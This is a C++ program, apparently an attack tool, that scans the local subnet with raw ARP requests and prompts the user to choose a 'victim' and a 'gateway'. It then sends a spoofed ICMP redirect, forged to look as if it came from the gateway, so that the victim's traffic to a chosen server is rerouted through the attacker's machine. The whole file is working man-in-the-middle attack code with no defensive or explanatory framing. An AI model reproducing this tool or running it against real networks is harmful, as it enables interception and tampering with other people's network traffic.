#include <iostream>
#include <cstring>
#include <unistd.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>

using namespace std;

struct arp_header {
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
} __attribute__((packed));

string macToStr(uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return string(buf);
}

struct device {
    string ip;
    uint8_t mac[6];
};

unsigned short checksum(unsigned short* buf, int len) {
    unsigned long sum = 0;
    for (; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}


int main(int argc, char *argv[]) {
    if (argc != 3) {
        cout << "Usage: " << argv[0] << " <server_ip> <network_interface>" << endl;
        return 1;
    }
    string server_ip = argv[1];
    const char* network_interface = argv[2];
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }
    uint8_t local_mac[6];
    uint32_t local_ip;
    struct ifreq ifr;
    strncpy(ifr.ifr_name,network_interface, IFNAMSIZ - 1);
    if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        return 1;
    }
    memcpy(local_mac, ifr.ifr_hwaddr.sa_data, 6);
    if(ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        return 1;
    }
    local_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
    struct in_addr ip_addr;
    ip_addr.s_addr = local_ip;
    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex(network_interface);
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, local_mac, 6);
    uint32_t base_ip = ntohl(local_ip) & 0xFFFFFF00;
    struct device *devices =(struct device *) malloc(sizeof(struct device) * 255);
    for (int i = 1; i < 255; i++)
    {
        uint32_t target_ip = htonl(base_ip | i);
        if (target_ip == local_ip) continue;
        uint8_t buffer[ETH_FRAME_LEN] = {0};
        struct ethhdr* eth = (struct ethhdr*)buffer;
        memset(eth->h_dest, 0xFF, ETH_ALEN);
        memcpy(eth->h_source, local_mac, ETH_ALEN);
        eth->h_proto = htons(ETH_P_ARP);
        struct arp_header* arp = (struct arp_header*)(buffer + ETHER_HDR_LEN);
        arp->htype = htons(1);
        arp->ptype = htons(ETH_P_IP);
        arp->hlen = 6;
        arp->plen = 4;
        arp->opcode = htons(ARPOP_REQUEST);
        memcpy(arp->sender_mac, local_mac, 6);
        memcpy(arp->sender_ip, &local_ip, 4);
        memset(arp->target_mac, 0x00, 6);
        memcpy(arp->target_ip, &target_ip, 4);

        sendto(sockfd, buffer, 42, 0, (struct sockaddr*)&sa, sizeof(sa));
    }
    cout<<"Available devices\n";
    cout<<"----------------------------------\n";
    cout<<"Index |       IP       |       MAC\n";
    cout<<"----------------------------------\n";
    int received = 0;
    while (true) {
        uint8_t recv_buf[ETH_FRAME_LEN];
        ssize_t len = recvfrom(sockfd, recv_buf, sizeof(recv_buf), 0, nullptr, nullptr);
        
        if (len < 0) {
            if (errno == EWOULDBLOCK || errno == EAGAIN) {
                break;
            }
            continue;
        }

        struct ethhdr* eth = (struct ethhdr*)recv_buf;
        if (ntohs(eth->h_proto) != ETH_P_ARP) continue;

        struct arp_header* arp = (struct arp_header*)(recv_buf + ETHER_HDR_LEN);
        if (ntohs(arp->opcode) != 2) continue;

        uint32_t sender_ip;
        memcpy(&sender_ip, arp->sender_ip, 4);
        if (sender_ip == local_ip) continue;

        struct in_addr ip_tmp;
        ip_tmp.s_addr = sender_ip;
        cout<<received<<"     | " << inet_ntoa(ip_tmp) << "       |" << macToStr(arp->sender_mac) << endl;
        devices[received].ip = inet_ntoa(ip_tmp);
        memcpy(devices[received].mac, arp->sender_mac, 6);
        received++;
    }
    cout<<"----------------------------------\n";
    close(sockfd);
    cout<<"Select Victim IP index: ";
    int victim_index,gateway_index;
    cin>>victim_index;
    cout<<"Select Gateway IP index: ";
    cin>>gateway_index;
    cout<<"Victim IP: "<<devices[victim_index].ip<<", Gateway IP: "<<devices[gateway_index].ip<<", Attacker IP: "<<inet_ntoa(ip_addr)<<endl;
    
    int sockfd_icmp = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd_icmp < 0) {
        perror("socket");
        return 1;
    }

    uint8_t buffer[BUFSIZ] = {};
    struct ether_header* eth = (struct ether_header*)buffer;
    struct iphdr* ip = (struct iphdr*)(buffer + sizeof(struct ether_header));
    struct icmphdr* icmp = (struct icmphdr*)(buffer + sizeof(struct ether_header) + sizeof(struct iphdr));

    uint8_t victim_mac[6];
    memcpy(victim_mac, devices[victim_index].mac, 6);
    uint8_t attacker_mac[6];
    memcpy(attacker_mac, local_mac, 6);
    uint8_t gateway_mac[6];
    memcpy(gateway_mac, devices[gateway_index].mac, 6);

    memcpy(eth->ether_shost, attacker_mac, 6);
    memcpy(eth->ether_dhost, victim_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8 + 20);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_ICMP;
    ip->check = 0;
    ip->saddr = inet_addr(devices[gateway_index].ip.c_str()); 
    ip->daddr = inet_addr(devices[victim_index].ip.c_str()); 
    ip->check = checksum((unsigned short*)ip, sizeof(struct iphdr));

    icmp->type = 5;
    icmp->code = 1;
    icmp->checksum = 0;
    icmp->un.gateway = inet_addr(inet_ntoa(ip_addr));

    uint8_t* data = (uint8_t*)(icmp + 1);
    memset(data, 0, 28);

    struct iphdr* fake_ip = (struct iphdr*)data;
    fake_ip->version = 4;
    fake_ip->ihl = 5;
    fake_ip->tos = 0;
    fake_ip->ttl = 64;
    fake_ip->protocol = IPPROTO_ICMP;
    fake_ip->saddr = inet_addr(devices[victim_index].ip.c_str());
    fake_ip->daddr = inet_addr(server_ip.c_str());
    fake_ip->tot_len = htons(sizeof(struct iphdr) + 8);

    struct icmphdr* inner_icmp = (struct icmphdr*)(data + sizeof(struct iphdr));
    inner_icmp->type = 0;
    inner_icmp->code = 0;
    inner_icmp->checksum = 0xffff;
    inner_icmp->un.echo.id = htons(0);
    inner_icmp->un.echo.sequence = htons(0);

    icmp->checksum = 0;
    icmp->checksum = checksum((unsigned short*)icmp, sizeof(struct icmphdr) + 28);

    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_ifindex = if_nametoindex(network_interface);
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, victim_mac, 6);

    int pkt_size = sizeof(struct ether_header) + ntohs(ip->tot_len);
    if (sendto(sockfd_icmp, buffer, pkt_size, 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto");
    }
    close(sockfd);
    
    cout<<"IMCP Redirect packet sent successfully!\n";
    return 0;
}